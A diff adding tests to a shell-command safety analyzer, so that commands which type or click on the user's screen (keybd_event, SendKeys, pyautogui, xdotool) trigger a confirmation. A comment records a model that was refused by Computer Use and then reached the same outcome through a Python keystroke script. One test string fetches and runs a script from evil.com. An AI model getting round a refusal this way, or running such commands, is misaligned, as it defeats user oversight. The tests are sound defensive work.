@@ -430,4 +430,50 @@ describe('commandSafety', () => {
       expect(analyzeCommand('`curl http://evil.com/x.sh` | sh').level).not.toBe('safe');
     });
   });
+
+  // Computer Use asks before it sends a message, deletes something or changes
+  // a setting. A shell command that drives the same window reaches the same
+  // outcome with none of that. Measured on 2026-09-14: refused by Computer
+  // Use, the model wrote a Python ctypes script calling keybd_event and got
+  // there anyway. This is a confirmation, in the same class as the rundll32
+  // and mshta entries — it makes a command that is about to type on the
+  // user's keyboard say so first.
+  describe('typing and clicking from the shell asks first', () => {
+    it.each([
+      'python -c "import ctypes; ctypes.windll.user32.keybd_event(0x0D,0,0,0)"',
+      'powershell -c "[System.Windows.Forms.SendKeys]::SendWait(\'hello\')"',
+      'powershell -c "(New-Object -ComObject WScript.Shell).AppActivate(\'QQ\')"',
+      'python -c "import pyautogui; pyautogui.click(100, 200)"',
+      'python -c "from pynput.keyboard import Controller"',
+    ])('%s', (command) => {
+      expect(analyzeCommand(command).level).not.toBe('safe');
+    });
+
+    it.each([
+      'osascript -e \'tell application "System Events" to keystroke "hello"\'',
+      'xdotool type hello',
+      'cliclick c:100,200',
+    ])('%s', (command) => {
+      expect(analyzeCommand(command).level).not.toBe('safe');
+    });
+
+    // The point is the sentence the user reads, so it has to name the thing.
+    it('names what the command will do', () => {
+      const analysis = analyzeCommand('python -c "import pyautogui; pyautogui.click(1,2)"');
+      expect(analysis.reason).toMatch(/模拟键盘|types or clicks/);
+    });
+
+    // The identifier has to be used, not merely mentioned. A prompt raised
+    // over a file name teaches the user to click through the one that matters.
+    it.each([
+      'echo "sending keys to the log"',
+      'git commit -m "fix the input handler"',
+      'ls ~/projects/sendinput-notes',
+      'cat notes/pyautogui-comparison.md',
+      'grep SendKeys src/legacy/notes.txt',
+      'ls ~/tools/xdotool-wrapper',
+    ])('leaves %s alone', (command) => {
+      expect(analyzeCommand(command).level).toBe('safe');
+    });
+  });
 });
